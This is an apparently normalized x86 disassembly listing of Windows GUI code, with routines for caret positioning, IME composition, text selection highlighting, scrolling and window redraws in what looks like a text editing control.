call sub_40d580
pop edi
pop esi
retn 0xc
mov edx [ esi ]
push 0x0
push eax
mov ecx esi
call [ edx ]
sub_40d9b0
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ ecx + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
retn 0x4
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x4 ]
retn 0x4
sub_40d9e0
mov eax [ ecx ]
test eax eax
je r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
cmp [ eax + 0x4 ] edx
je r-xdata
mov edx [ eax ]
push eax
mov [ ecx ] edx
call j_sub_429931
add esp 0x4
mov ecx eax
mov eax [ ecx ]
test eax eax
je r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
mov ecx eax
mov eax [ ecx ]
test eax eax
jne r-xdata
sub_40da20
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
call sub_421820
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ebp [ esp + 0x18 ]
xor ebx ebx
test edx edx
mov edi eax
jle r-xdata
mov ecx [ esp + 0x1c ]
sub edi ebp
test ecx ecx
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx ]
mov ecx [ esi ]
mov edx [ ecx + 0x10 ]
add eax ebx
movzx eax [ edx + eax * 2 ]
push eax
push edi
mov ecx rw-data
call sub_4138a0
cmp eax ebp
jge r-xdata
pop edi
mov [ esi + 0x8 ] bx
pop esi
pop ebp
pop ebx
retn 0xc
sub eax ebp
jns r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
inc ebx
cmp ebx edx
mov edi eax
jl r-xdata
test edi edi
jge r-xdata
neg eax
cmp eax edi
jge r-xdata
neg edi
inc ebx
sub_40daa0
mov eax [ ecx + 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] eax
xor eax eax
retn
mov edx [ ecx ]
mov eax [ edx ]
test eax eax
je r-xdata
mov eax 0x1
retn
mov [ ecx ] eax
mov eax [ eax + 0x8 ]
sub_40dad0
mov eax [ ecx + 0x4 ]
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] eax
xor eax eax
retn
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
mov eax 0x1
retn
mov [ ecx ] eax
mov eax [ eax + 0xc ]
sub_40db00
push esi
mov esi [ ecx ]
mov eax [ esi + 0x8 ]
test eax eax
mov [ ecx + 0x4 ] eax
je r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
movsx edx [ ecx + 0x8 ]
push edi
mov [ ecx + 0x4 ] eax
mov dx [ eax ]
sub [ ecx + 0x8 ] dx
pop esi
retn
mov eax [ esi + 0xc ]
pop edi
mov eax [ eax + 0x8 ]
test eax eax
mov [ ecx + 0x4 ] eax
jne r-xdata
mov eax [ ecx + 0x4 ]
mov edi [ eax + 0x4 ]
add edi [ eax ]
cmp edi edx
jge r-xdata
sub_40db40
push esi
mov esi ecx
lea ecx [ esi + 0x54 ]
call sub_40db00
mov al [ esi + 0x44 ]
test al al
je r-xdata
pop esi
retn
lea ecx [ esi + 0x1c ]
call sub_40db00
lea ecx [ esi + 0x30 ]
pop esi
jmp sub_40db00
sub_40db90
sub esp 0x5c
push ebx
push ebp
push esi
mov esi ecx
mov ebx [ esi + 0x60 ]
mov edx [ esi + 0x74 ]
mov cl [ rw-data ]
xor eax eax
sub ebx edx
test cl cl
sete al
push edi
mov [ esp + 0x10 ] ebx
lea eax [ eax + eax + 0x2 ]
mov edi eax
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
movsx ecx [ eax + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edi
push 0x0
push edx
call [ CreateCaret@IAT ]
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
mov eax rw-data
movsx eax [ eax + 0x4 ]
mov ebp [ esi + 0x64 ]
mov ecx [ esi + 0x78 ]
sub ebp eax
mov eax edi
cdq
sub eax edx
sub ebp ecx
sar eax 0x1
push ebp
sub ebx eax
push ebx
call [ SetCaretPos@IAT ]
mov ecx [ esi + 0x8 ]
push ecx
call [ ShowCaret@IAT ]
mov edx [ esi + 0x8 ]
push edx
call ImmGetContext
mov ebx eax
test ebx ebx
je r-xdata
mov eax rw-data
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5c
retn
xor eax eax
mov ecx 0xf
lea edi [ esp + 0x30 ]
[ edi ]
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
movsx eax [ eax ]
movsx edx [ esi + 0x8e ]
mov ecx [ esp + 0x10 ]
neg eax
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x14 ]
push eax
add edx ebp
push ebx
mov [ esp + 0x4f ] 0x80
mov [ esp + 0x1c ] 0x20
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
call ImmSetCompositionWindow
lea ecx [ esp + 0x30 ]
push ecx
push ebx
call ImmSetCompositionFontA
mov edx [ esi + 0x8 ]
push ebx
push edx
call ImmReleaseContext
mov eax rw-data
sub_40dca0
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov eax 0x1
retn
sub_40dcd0
mov eax [ ecx + 0x4 ]
movsx edx [ ecx + 0x8 ]
cmp edx [ eax + 0x4 ]
jl r-xdata
xor eax eax
retn
mov ecx [ ecx ]
cmp eax [ ecx + 0xc ]
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov eax 0x1
retn
sub_40dd40
xor eax eax
mov ax [ ecx + 0x5c ]
test ax ax
je r-xdata
mov eax [ ecx + 0x58 ]
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
dec eax
mov [ ecx + 0x5c ] ax
retn
mov [ ecx + 0x58 ] eax
mov dx [ eax + 0x4 ]
mov [ ecx + 0x5c ] dx
mov eax [ ecx + 0x54 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
retn
mov [ ecx + 0x54 ] eax
mov eax [ eax + 0xc ]
sub_40dd80
mov eax [ ecx + 0x58 ]
movsx edx [ ecx + 0x5c ]
cmp edx [ eax + 0x4 ]
jge r-xdata
mov eax [ ecx + 0x58 ]
mov eax [ eax + 0x8 ]
xor edx edx
cmp eax edx
jne r-xdata
inc [ ecx + 0x5c ]
retn
mov [ ecx + 0x58 ] eax
mov [ ecx + 0x5c ] dx
mov eax [ ecx + 0x54 ]
mov eax [ eax ]
cmp eax edx
je r-xdata
retn
mov [ ecx + 0x54 ] eax
mov eax [ eax + 0x8 ]
sub_40ddc0
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
mov al [ ebx + 0x1e ]
test al al
push ebp
push esi
mov ebp ecx
push edi
mov [ esp + 0x10 ] ebp
je r-xdata
mov edi [ esp + 0x30 ]
push edi
mov ecx ebx
call sub_421820
mov ecx [ ebp + 0x74 ]
mov esi eax
mov eax [ edi + 0x4 ]
sub esi ecx
xor ebp ebp
test eax eax
jle r-xdata
mov ebx [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
movsx eax [ ebx + 0x12 ]
mov esi [ esp + 0x34 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] ecx
movsx ecx [ ebx ]
lea eax [ ecx + ecx * 4 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov edi esi
sub edi eax
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
add eax edi
push 0x1
mov [ esp + 0x1c ] edi
mov [ esp + 0x24 ] eax
call [ GetStockObject@IAT ]
mov edi [ esp + 0x28 ]
push eax
lea edx [ esp + 0x18 ]
push edx
push edi
call [ FillRect@IAT ]
mov eax [ ebp + 0x78 ]
mov cl [ ebp + 0x44 ]
add esi eax
test cl cl
je r-xdata
cmp ebp [ edi + 0x4 ]
mov ebx [ esp + 0x34 ]
jge r-xdata
mov edi edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x1c
cmp esi [ ebp + 0x40 ]
jge r-xdata
mov eax [ esp + 0x10 ]
mov cl [ eax + 0x44 ]
test cl cl
je r-xdata
jmp r-xdata
mov esi eax
mov eax [ edi + 0x4 ]
inc ebp
cmp ebp eax
jl r-xdata
cmp esi [ ebp + 0x2c ]
jl r-xdata
mov edi [ eax + 0x78 ]
mov edx [ eax + 0x40 ]
add ebx edi
cmp ebx edx
jg r-xdata
cmp esi [ esp + 0x3c ]
jg r-xdata
mov ecx [ edi ]
mov edx [ ebx + 0x10 ]
add ecx ebp
movzx eax [ edx + ecx * 2 ]
mov ecx [ esp + 0x40 ]
push eax
push esi
call sub_4138a0
cmp eax [ esp + 0x38 ]
jge r-xdata
movsx ecx [ ebx ]
movsx edx [ ebx + 0x6 ]
sub esi ecx
sub esi eax
lea eax [ esp + 0x14 ]
push eax
add edx esi
push edi
mov [ esp + 0x20 ] esi
mov [ esp + 0x28 ] edx
call [ InvertRect@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x1c
mov ecx [ eax + 0x2c ]
cmp ebx ecx
jl r-xdata
mov ecx [ edi ]
mov edx [ esp + 0x2c ]
mov eax [ edx + 0x10 ]
add ecx ebp
xor edi edi
mov di [ eax + ecx * 2 ]
test edi 0x7f00
je r-xdata
cmp ecx edx
jne r-xdata
cmp di 0x9
je r-xdata
mov ecx [ esp + 0x40 ]
mov ecx [ ecx + 0x20 ]
mov edx [ ecx ]
push ebx
movzx eax di
push esi
push eax
mov eax [ esp + 0x34 ]
push eax
call [ edx ]
jmp r-xdata
cmp ebx ecx
jne r-xdata
mov edx [ eax + 0x74 ]
mov ecx [ eax + 0x28 ]
mov eax [ eax + 0x3c ]
sub ecx edx
sub eax edx
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ esp + 0x40 ]
movzx eax di
push eax
push esi
call sub_4138a0
mov esi eax
cmp esi [ esp + 0x3c ]
jg r-xdata
mov edx [ esp + 0x40 ]
movsx eax [ edx ]
mov edx [ esp + 0x28 ]
movzx ecx di
push ecx
mov ecx ebx
sub ecx eax
push ecx
push esi
push edx
call sub_413c30
add esp 0x10
cmp ebx edx
jne r-xdata
mov ecx [ eax + 0x28 ]
sub ecx [ eax + 0x74 ]
jmp r-xdata
mov eax [ esp + 0x40 ]
movsx edx [ eax ]
movsx eax [ eax + 0x6 ]
sub ebx edx
mov edx [ esp + 0x28 ]
sub ebx edi
dec ebx
add eax ebx
dec ecx
mov [ esp + 0x14 ] ecx
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] eax
call [ InvertRect@IAT ]
mov ecx [ esp + 0x30 ]
mov eax [ ecx + 0x4 ]
inc ebp
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x40 ]
movsx ecx [ eax + 0x12 ]
mov edx [ eax + 0x3c ]
mov esi [ eax + 0x74 ]
mov ecx [ esp + 0x40 ]
movsx ecx [ ecx + 0x12 ]
sub edx esi
mov [ esp + 0x1c ] edx
jmp r-xdata
mov [ esp + 0x1c ] esi
mov edi [ esp + 0x30 ]
lea esp [ esp ]
sub_40e010
push ecx
mov al [ ecx + 0xc ]
push ebx
push ebp
push esi
xor esi esi
cmp al 0x40
push edi
mov [ esp + 0x10 ] ecx
mov eax rw-data
je r-xdata
movsx eax [ eax + 0x14 ]
mov edi [ esp + 0x18 ]
mov [ edi + 0x10 ] eax
mov ebp [ ecx + 0x4c ]
test ebp ebp
je r-xdata
mov eax rw-data
mov eax [ esp + 0x1c ]
cmp eax 0x3
je r-xdata
mov ebx [ edi + 0x4 ]
cmp [ ecx + 0xc ] 0x40
mov eax rw-data
je r-xdata
cmp eax 0x2
je r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
movsx ecx [ eax + 0x14 ]
sub [ edi + 0x10 ] ecx
mov eax rw-data
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
test eax eax
jne r-xdata
mov ebp [ ebp ]
test ebp ebp
jne r-xdata
cmp [ ecx + 0xc ] 0x40
mov eax rw-data
je r-xdata
cmp [ ecx + 0xc ] 0x40
mov eax rw-data
je r-xdata
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push edx
call sub_421820
xor ebx ebx
cmp [ edi + 0x8 ] bx
mov [ edi + 0xc ] eax
jle r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
movsx edx [ eax + 0x6 ]
movsx ecx [ ebp + 0x1c ]
imul ecx edx
mov eax 0x51eb851f
imul ecx
mov ecx [ edi + 0x10 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add ecx edx
mov [ edi + 0x10 ] ecx
mov esi [ esi + 0x8 ]
test esi esi
mov ecx [ esp + 0x10 ]
jne r-xdata
mov eax rw-data
movsx edx [ eax + 0x2 ]
movsx eax [ edi + 0x8 ]
imul edx eax
mov [ edi + 0xc ] edx
mov eax rw-data
mov eax [ edi + 0x4 ]
cmp ebx [ eax + 0x4 ]
jge r-xdata
mov ecx [ esp + 0x10 ]
cmp [ ecx + 0xc ] 0x40
mov ecx rw-data
je r-xdata
mov edx [ esi ]
mov eax [ ebp + 0x10 ]
add edx ebx
movzx edx [ eax + edx * 2 ]
mov eax [ edi + 0xc ]
push edx
push eax
call sub_4138a0
mov [ edi + 0xc ] eax
movsx ecx [ edi + 0x8 ]
inc ebx
cmp ebx ecx
jl r-xdata
mov ecx rw-data
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
sub_40e150
mov eax [ esp + 0x4 ]
cmp eax 0x9
push esi
mov esi ecx
je r-xdata
pop esi
retn 0x8
cmp eax 0x100
push 0x2
jl r-xdata
mov ecx esi
push eax
call sub_4176f0
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
push eax
call sub_418920
add esp 0x4
push 0x2223
push eax
call sub_418960
add esp 0x8
mov ecx esi
push eax
call sub_4176f0
pop esi
retn 0x8
sub_40e1b0
sub esp 0x24
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x41
je r-xdata
pop esi
add esp 0x24
retn 0x8
mov ecx [ esp + 0x30 ]
test ecx ecx
mov eax [ esp + 0x2c ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x18 ] ecx
jmp r-xdata
movsx eax [ eax + 0x4 ]
mov ecx [ esp + 0x24 ]
movsx edx [ esi + 0x84 ]
sub ecx eax
sub ecx [ esi + 0x78 ]
push 0x1
lea eax [ esp + 0x8 ]
mov [ esp + 0xc ] ecx
mov ecx [ esi + 0x8 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call [ InvalidateRect@IAT ]
mov eax rw-data
push 0x2
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call sub_40e010
movsx edx [ esi + 0x86 ]
cmp [ esi + 0xc ] 0x40
mov [ esp + 0x4 ] 0x0
mov [ esp + 0xc ] edx
mov eax rw-data
je r-xdata
sub_40e240
sub esp 0x38
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop esi
add esp 0x38
retn 0x8
mov eax [ esp + 0x44 ]
test eax eax
push ebx
push ebp
push edi
mov edi [ esp + 0x4c ]
mov [ esp + 0x20 ] edi
jne r-xdata
mov ecx [ edi + 0xc ]
push 0x2
lea edx [ esp + 0x24 ]
mov [ esp + 0x3c ] ecx
push edx
mov ecx esi
mov [ esp + 0x2c ] eax
mov [ esp + 0x3c ] edi
call sub_40e010
push 0x2
lea eax [ esp + 0x38 ]
push eax
mov ecx esi
call sub_40e010
movsx ecx [ esi + 0x86 ]
mov al [ esi + 0xc ]
cmp al 0x40
mov [ esp + 0x18 ] ecx
mov [ esp + 0x10 ] 0x0
mov ecx rw-data
je r-xdata
mov eax [ edi + 0x8 ]
movsx edx [ ecx + 0x4 ]
mov ecx [ esp + 0x30 ]
mov ebx [ esi + 0x78 ]
sub ecx edx
sub ecx ebx
cmp al 0x40
mov [ esp + 0x14 ] ecx
mov ebp rw-data
je r-xdata
mov ecx rw-data
mov eax rw-data
jmp r-xdata
mov ebp rw-data
mov eax ebp
movsx ecx [ eax + 0x6 ]
movsx edx [ edi + 0x1c ]
imul ecx edx
mov eax 0x51eb851f
imul ecx
movsx ecx [ ebp + 0x4 ]
mov ebp [ esp + 0x44 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x8 ]
sub edx ecx
sub edx ebx
add edx ebp
mov [ esp + 0x1c ] edx
push 0x1
lea edx [ esp + 0x14 ]
push edx
push eax
call [ InvalidateRect@IAT ]
pop edi
pop ebp
pop ebx
sub_40e330
sub esp 0x10
movsx eax [ ecx + 0x86 ]
mov [ esp + 0x8 ] eax
mov al [ ecx + 0xc ]
cmp al 0x40
mov [ esp ] 0x0
mov edx rw-data
je r-xdata
movsx edx [ edx + 0x4 ]
push esi
mov esi [ ecx + 0x78 ]
push edi
mov edi [ esp + 0x1c ]
sub edi edx
sub edi esi
cmp al 0x40
mov [ esp + 0xc ] edi
mov edi rw-data
je r-xdata
mov edx rw-data
mov eax rw-data
jmp r-xdata
mov edi rw-data
mov eax edi
movsx edx [ eax + 0x6 ]
mov eax [ esp + 0x20 ]
movsx eax [ eax + 0x1c ]
imul edx eax
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
movsx eax [ edi + 0x4 ]
sub edx eax
mov eax [ esp + 0x24 ]
sub edx esi
add edx eax
mov eax [ ecx + 0x8 ]
mov [ esp + 0x14 ] edx
push 0x1
lea edx [ esp + 0xc ]
push edx
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
add esp 0x10
retn 0xc
sub_40e3d0
push esi
mov esi ecx
mov al [ esi + 0x44 ]
test al al
je r-xdata
pop esi
retn
mov [ esi + 0x44 ] 0x0
call sub_4015b0
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x2c ]
push eax
push ecx
push edx
mov ecx esi
call sub_40e330
sub_40e400
push esi
mov esi ecx
mov cl [ esi + 0xc ]
mov al 0x40
test al cl
jne r-xdata
pop esi
retn
mov cl [ rw-data ]
test cl cl
push edi
mov edi [ SetScrollInfo@IAT ]
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ esi + 0x80 ]
mov [ rw-data ] ecx
cmp [ esi + 0xc ] al
mov eax rw-data
je r-xdata
pop edi
movsx eax [ esi + 0x7e ]
dec eax
mov [ rw-data ] eax
movsx ecx [ esi + 0x88 ]
mov [ rw-data ] ecx
movsx edx [ esi + 0x70 ]
push 0x1
push rw-data
mov [ rw-data ] edx
mov eax [ esi + 0x8 ]
push 0x0
push eax
call edi
movsx edx [ esi + 0x84 ]
movsx eax [ eax + 0x6 ]
sub edx eax
push 0x1
mov [ rw-data ] edx
mov ecx [ esi + 0x78 ]
push rw-data
mov [ rw-data ] ecx
mov edx [ esi + 0x8 ]
push 0x1
push edx
call edi
mov eax rw-data
sub_40e4b0
sub esp 0x200
test ecx ecx
je r-xdata
add esp 0x200
retn
test [ ecx + 0xc ] 0x40
jne r-xdata
mov eax [ ecx + 0x90 ]
push eax
mov al [ ecx + 0x48 ]
test al al
sete cl
dec cl
and cl 0xfd
add cl 0x2d
movsx edx cl
push edx
push r--data
lea eax [ esp + 0xc ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edx [ rw-data ]
add esp 0x14
lea ecx [ esp ]
push ecx
push edx
call [ SetWindowTextA@IAT ]
sub_40e510
movzx eax [ esp + 0x4 ]
cmp eax 0x5
push esi
mov esi ecx
ja r-xdata
pop esi
retn 0x4
push ebx
push edi
jmp [ eax * 4 + jump_table_40e6ac ]
lea ecx [ esi + 0x68 ]
call sub_40dad0
jmp r-xdata
lea ecx [ esi + 0x68 ]
call sub_40daa0
jmp r-xdata
movsx eax [ esi + 0x8c ]
mov edi [ esi + 0x78 ]
lea ebx [ esi + 0x68 ]
mov ecx ebx
sub edi eax
call sub_40dad0
test eax eax
jne r-xdata
movsx edi [ esi + 0x8c ]
mov edx [ esi + 0x78 ]
lea ebx [ esi + 0x68 ]
mov ecx ebx
add edi edx
call sub_40daa0
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
push rw-data
push 0x1
push ecx
call [ GetScrollInfo@IAT ]
mov edi [ rw-data ]
mov eax [ esi + 0x78 ]
cmp edi eax
mov bl 0x40
jge r-xdata
push 0x3
lea ecx [ esi + 0x68 ]
push ecx
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e400
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40db90
pop edi
pop ebx
push 0x3
push ebx
mov ecx esi
call sub_40e010
cmp [ esi + 0x78 ] edi
jle r-xdata
push 0x3
push ebx
mov ecx esi
call sub_40e010
cmp [ esi + 0x78 ] edi
jge r-xdata
cmp edi [ esi + 0x78 ]
jle r-xdata
lea ecx [ esi + 0x68 ]
lea esp [ esp ]
mov ecx ebx
call sub_40dad0
test eax eax
je r-xdata
mov ecx ebx
call sub_40daa0
test eax eax
je r-xdata
lea ecx [ esi + 0x68 ]
lea ebx [ ebx ]
cmp [ esi + 0xc ] bl
mov eax rw-data
je r-xdata
jmp r-xdata
jmp r-xdata
cmp [ esi + 0xc ] bl
mov eax rw-data
je r-xdata
movsx eax [ eax + 0x6 ]
mov edx [ ecx ]
movsx edx [ edx + 0x1c ]
imul edx eax
mov eax 0xae147ae1
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x78 ]
add eax edx
cmp edi eax
mov [ esi + 0x78 ] eax
jl r-xdata
mov eax rw-data
movsx eax [ eax + 0x6 ]
mov edx [ ecx ]
movsx edx [ edx + 0x1c ]
imul edx eax
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x78 ]
add eax edx
cmp edi eax
mov [ esi + 0x78 ] eax
jg r-xdata
mov eax rw-data
call sub_40dad0
test eax eax
jne r-xdata
call sub_40daa0
test eax eax
jne r-xdata
sub_40e6d0
sub esp 0x14
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x41
je r-xdata
pop esi
add esp 0x14
retn
mov eax [ esi + 0x50 ]
mov [ esp + 0x4 ] eax
mov eax [ eax + 0xc ]
push 0x0
lea ecx [ esp + 0x8 ]
mov [ esp + 0xc ] eax
mov ax [ eax + 0x4 ]
push ecx
mov ecx esi
mov [ esp + 0x14 ] ax
call sub_40e010
push 0x0
lea edx [ esi + 0x54 ]
push edx
mov ecx esi
call sub_40e010
mov eax [ esp + 0x14 ]
mov [ esi + 0x80 ] eax
push edi
lea ecx [ ecx ]
movsx eax [ eax + 0xe ]
mov ecx [ esi + 0x78 ]
mov edi [ esi + 0x64 ]
add eax ecx
cmp edi eax
jle r-xdata
mov eax rw-data
lea ecx [ esi + 0x68 ]
call sub_40dad0
push 0x1
push ecx
mov ecx esi
mov edi eax
call sub_40e010
test edi edi
jne r-xdata
cmp dl 0x40
mov eax rw-data
je r-xdata
mov edx [ esi + 0x78 ]
mov ecx [ esi + 0x64 ]
sub ecx edx
movsx edx [ esi + 0x84 ]
cmp ecx edx
jle r-xdata
mov ecx esi
call sub_40e1a0
jmp r-xdata
movsx edx [ eax + 0x6 ]
movsx eax [ esi + 0x84 ]
sub eax edx
add eax ecx
cmp [ esi + 0x80 ] eax
jg r-xdata
mov eax rw-data
cmp [ esi + 0xc ] 0x40
jne r-xdata
lea edi [ esi + 0x68 ]
nop
mov dl [ esi + 0xc ]
cmp dl 0x40
mov eax rw-data
je r-xdata
mov edx [ esi + 0x60 ]
cmp edx [ esi + 0x74 ]
jge r-xdata
cmp [ esi + 0x70 ] 0x0
je r-xdata
push 0x1
push edi
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e1a0
mov ecx [ esi + 0x78 ]
mov eax [ esi + 0x64 ]
sub eax ecx
movsx ecx [ esi + 0x84 ]
cmp eax ecx
jg r-xdata
mov edx [ esi + 0x60 ]
mov edi [ esi + 0x74 ]
movsx eax [ esi + 0x86 ]
sub edx edi
cmp edx eax
jle r-xdata
lea edi [ esi + 0x68 ]
mov edi edi
mov edi [ esp + 0x14 ]
mov ecx edi
call sub_40daa0
test eax eax
jne r-xdata
mov ecx esi
call sub_40e400
mov ecx esi
call sub_40db90
pop edi
lea edi [ esi + 0x68 ]
jmp r-xdata
push 0x1
push edi
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e1a0
mov ecx [ esi + 0x60 ]
cmp ecx [ esi + 0x74 ]
jl r-xdata
mov [ esi + 0x70 ] 0x0
movsx edx [ eax + 0x2 ]
movsx eax [ esi + 0x86 ]
sub eax edx
add eax [ esi + 0x74 ]
cmp edi eax
jg r-xdata
mov eax rw-data
mov cx [ esi + 0x8a ]
add [ esi + 0x70 ] cx
push 0x1
push edi
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e1a0
mov eax [ esi + 0x74 ]
mov edx [ esi + 0x60 ]
sub edx eax
movsx eax [ esi + 0x86 ]
cmp edx eax
jg r-xdata
mov ax [ esi + 0x8a ]
sub [ esi + 0x70 ] ax
cmp [ esi + 0x70 ] 0x0
jge r-xdata
dec [ esi + 0x70 ]
push 0x1
lea ecx [ esi + 0x68 ]
push ecx
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e1a0
cmp [ esi + 0x70 ] 0x0
jne r-xdata
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
sub_40e8d0
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
mov esi ecx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
mov ecx esi
call sub_40d9e0
push 0x8
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_40d9e0
cmp [ esi ] 0x0
jne r-xdata
mov [ eax + 0x4 ] edi
mov edx [ esi ]
mov [ eax ] edx
mov [ esi ] eax
pop edi
pop esi
retn 0x4
sub_40e960
push 0xffffffff
push sub_431cd0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov esi [ edi + 0x4c ]
test esi esi
mov [ esp + 0x14 ] 0x1
je r-xdata
mov eax [ edi + 0x90 ]
test eax eax
je r-xdata
lea ecx [ ecx ]
movsx ecx [ rw-data ]
mov edx [ edi + 0x18 ]
push ecx
push edx
call sub_424c60
add esp 0x8
push j_sub_420470
push 0xc
push 0x4
lea eax [ edi + 0xc0 ]
push eax
mov [ esp + 0x24 ] 0x0
call sub_429430
push j_sub_420470
push 0x5
push 0x4
add edi 0xac
push edi
mov [ esp + 0x24 ] 0xffffffff
call sub_429430
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call sub_429931
add esp 0x4
mov eax [ esi ]
mov ecx esi
mov [ edi + 0x4c ] eax
call sub_421730
push esi
call j_sub_429931
mov esi [ edi + 0x4c ]
add esp 0x4
test esi esi
jne r-xdata
sub_40ea20
mov eax [ ecx + 0x58 ]
mov dx [ eax ]
add [ ecx + 0x5c ] dx
mov eax [ ecx + 0x54 ]
mov edx [ eax + 0x8 ]
mov [ ecx + 0x58 ] edx
mov al [ ecx + 0x44 ]
test al al
je r-xdata
retn
mov eax [ ecx + 0x20 ]
mov dx [ eax ]
add [ ecx + 0x24 ] dx
mov eax [ ecx + 0x1c ]
mov edx [ eax + 0x8 ]
mov [ ecx + 0x20 ] edx
mov eax [ ecx + 0x34 ]
mov dx [ eax ]
mov eax [ ecx + 0x30 ]
add [ ecx + 0x38 ] dx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x34 ] edx
sub_40ea90
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi ecx
mov al [ edi + 0xc ]
mov cl 0x40
cmp al cl
mov [ esp + 0x14 ] edi
jne r-xdata
mov [ esp + 0x10 ] rw-data
mov eax [ esp + 0x10 ]
mov eax rw-data
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov edx [ esp + 0x1c ]
push ecx
push edx
call [ SelectObject@IAT ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x1c ]
push 0x1
push eax
call [ SetBkMode@IAT ]
mov edi [ edi + 0x68 ]
test edi edi
je r-xdata
mov eax rw-data
movsx ebx [ eax + 0x14 ]
movsx eax [ eax + 0x12 ]
mov ebp [ esp + 0x20 ]
mov edx [ ebp ]
mov esi [ edi + 0x6c ]
sub edx eax
mov [ ebp ] edx
cmp [ edi + 0xc ] cl
mov eax rw-data
je r-xdata
mov edx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
mov [ esp + 0x8 ] edx
jmp [ SelectObject@IAT ]
lea ebx [ ebx ]
cmp ebx [ ebp + 0x4 ]
jl r-xdata
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
cmp ebx [ ebp + 0xc ]
jg r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp ]
push ecx
